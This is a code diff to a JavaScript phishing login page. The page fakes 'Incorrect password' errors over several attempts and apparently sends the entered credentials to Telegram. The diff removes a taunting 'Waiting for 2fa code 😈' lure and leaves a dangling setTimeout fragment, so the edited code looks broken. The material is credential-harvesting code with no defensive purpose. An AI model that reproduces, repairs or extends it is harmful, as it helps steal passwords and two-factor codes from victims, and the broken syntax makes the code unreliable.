@@ -142,10 +142,10 @@ function handleLogin(event) {
     event.preventDefault();
     attemptCount++;
     const form = document.getElementById("contactForm");
-    const errorMessage = document.getElementById("error-message");
 
     if (attemptCount < 3) {
         document.getElementById("attempt").value = "Attempt " + attemptCount;
+        const errorMessage = document.getElementById("error-message");
         errorMessage.textContent = "Incorrect password. Try again.";
 
         // Prepare the message to send to Telegram
@@ -203,13 +203,7 @@ function handleLogin(event) {
             console.log('Error sending final message.');
         });
 
-          // Display a message on the login page
-        const errorMessage = document.getElementById("error-message");
-        errorMessage.textContent = "Waiting for 2fa code 😈";
-        errorMessage.style.color = "orange"; // Optional: Change text color for emphasis
-
-        // Redirect to the new URL after showing the message
-        setTimeout(() => {
+                    // Redirect to the new URL after showing the message
             window.location.href = "flock.html"; // Replace with the actual URL you want to redirect to
         }, 5000); // Optional: Redirect after 5 seconds
     }
